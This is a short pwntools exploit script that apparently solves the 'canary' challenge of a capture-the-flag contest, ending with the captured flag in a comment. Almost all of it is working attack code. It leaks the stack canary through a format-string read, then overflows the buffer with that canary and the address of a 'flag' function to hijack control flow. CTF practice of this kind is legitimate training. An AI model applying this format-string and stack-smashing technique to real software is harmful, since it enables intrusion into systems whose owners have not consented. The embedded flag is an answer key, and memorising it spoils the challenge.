from pwn import *

#p = process("./canary"); gdb.attach(p)
p = remote("shell.actf.co", 20701)
e = ELF("./canary")

xpl = ""
xpl += "%17$lx"

p.sendlineafter("your name?", xpl)
canary = p.recvline()
canary = canary.split(" ")[5].replace("!", "")
canary = int(canary, 16)
info("Canary ==> %s"%hex(canary))

xpl = ""
xpl += "A"*56
xpl += p64(canary)
xpl += "A"*8
xpl += p64(e.sym["flag"])
p.sendlineafter("tell me?", xpl)

p.interactive()
#p.wait()
#core = p.corefile
#stack = core.rsp
#info("%#x stack", stack)

#actf{youre_a_canary_killer_>:(}